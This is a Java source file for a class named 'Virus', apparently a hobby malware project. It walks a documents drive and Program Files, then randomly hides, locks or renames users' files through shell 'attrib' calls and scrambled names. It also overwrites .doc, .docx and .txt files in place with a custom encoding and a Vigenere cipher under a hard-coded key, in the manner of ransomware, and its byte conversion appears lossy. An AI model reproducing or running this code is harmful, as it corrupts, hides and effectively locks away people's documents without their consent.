package model;

import coder.Mixer;
import coder.VigenereCoder;
import input_output.CommandLineInterpreter;
import input_output.IOFileHandling;
import org.apache.commons.io.FilenameUtils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.function.Predicate;

public class Virus {

    public static final String ALPHABET = "mhLNCoGa9.b?4nS7Z5TkPxyHv6d+8VMOJ!RlFjpY01 K=z2c'Er,/eW3XwUIqsQ-itgDAfuB*";
    public static final String KEY = "gndkdlkjjfe'em,ldidskfvkmjfnghhb";
    public static final Path DIRECTORY_WITH_EXE_FILES = Paths.get("C:", "Program Files");
    public static final Path DIRECTORY_WITH_DOC_FILES = Paths.get("E:", "docs");
    public static final int MAX_DEPTH = 3;

    private static List<String> filesNamesList = new ArrayList<>();
    private static Predicate<File> predicateExe = f -> f.getName().endsWith(".exe");
    private static Predicate<File> predicateTxt = f -> f.getName().endsWith(".txt");
    private static Predicate<File> predicateDoc = f -> f.getName().endsWith(".doc") || f.getName().endsWith(".docx");
    private static int depth = 0;

    public static List<String> searchFiles() {
        filesNamesList.clear();
        search(DIRECTORY_WITH_EXE_FILES.toFile(), predicateExe);
        return filesNamesList;
    }

    public static List<String> searchFiles(Path path, Predicate<File> predicate) {
        filesNamesList.clear();
        if (Files.exists(path)) {
            search(path.toFile(), predicate);
        }
        return filesNamesList;
    }

    private static void search(File file, Predicate<File> predicate) {
        if (file.isDirectory() && file.canRead()) {
            File[] files = file.listFiles();
            if (files != null && files.length > 0) {
                Arrays.stream(files).forEach(f -> Virus.enterFile(f, predicate));
            }
        }
    }

    private static void enterFile(File f, Predicate<File> predicate) {
        if (f.isDirectory()) {
            if (depth < MAX_DEPTH) {
                depth++;
                search(f, predicate);
                depth--;
            }
        } else if (predicate.test(f)) {
            if (!filesNamesList.contains(f.getAbsolutePath())) {
                filesNamesList.add(f.getAbsolutePath());
            }
        }
    }

    public static void changeFilesAttributes() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, file -> true);
        for (String s : filesList) {
            File file = new File(s);
            switch ((int) (Math.random() * 4)) {
                case 0: {
                    file.setReadOnly();
                    break;
                }
                case 1: {
                    CommandLineInterpreter.sendCommand("attrib +H " + s);
                    break;
                }
                case 2: {
                    int dotIndex = s.indexOf(".");
                    if (dotIndex > 0) {
                        file.renameTo(new File(s.substring(0, s.indexOf("."))));
                    }
                    break;
                }
                case 3: {
                    String filePath = Paths.get(s).getParent().toString();
                    String extension = null;
                    String fileName = null;
                    int dotIndex = s.indexOf(".");
                    if (dotIndex > 0) {
                        extension = "." + FilenameUtils.getExtension(s);
                        fileName = s.substring(s.lastIndexOf('\\', s.indexOf('.')));
                        fileName = Mixer.encode(fileName);
                    }
                    file.renameTo(new File(filePath + fileName + extension));
                    break;
                }
            }
        }
    }

    private static String byteArrToString(byte[] array) {
        String byteInString = "";
        assert array != null;
        for (byte b : array) {
            byteInString += b;
        }
        return byteInString;
    }

    private static byte[] stringToByteArr(String s) {
        byte[] byteArr = new byte[s.length()];
        for (int i = 0; i < s.length(); i++) {
            byteArr[i] = (byte) (s.charAt(i) == '1' ? 1 : 0);
        }
        return byteArr;
    }

    public static void encodeFiles() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
        for (String s : filesList) {
            byte[] fileInByte = IOFileHandling.getByteArray(s);
            String encodedFile = Mixer.encode(byteArrToString(fileInByte));
            IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
        }
    }

    public static void decodeFiles() {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
        for (String s : filesList) {
            byte[] fileInByte = IOFileHandling.getByteArray(s);
            String encodedFile = Mixer.decode(byteArrToString(fileInByte));
            IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
        }
    }

    public static void encodeFileContent() throws IOException {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateTxt);
        for (String s : filesList) {
            String encodedText = VigenereCoder.getInstance().encode(KEY, prepareInputText(s));
            IOFileHandling.writeToFile(encodedText, s);
        }
    }

    public static void decodeFileContent() throws IOException {
        List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateTxt);
        System.out.println(filesList.size());
        for (String s : filesList) {
            System.out.println(s);
            String encodedText = VigenereCoder.getInstance().decode(KEY, prepareInputText(s));
            IOFileHandling.writeToFile(encodedText, s);
        }
    }

    private static String prepareInputText(String fileName) {
        String text = IOFileHandling.readFromFile(fileName);
        VigenereCoder.getInstance().setAlphabet(ALPHABET);
        return text;
    }
}
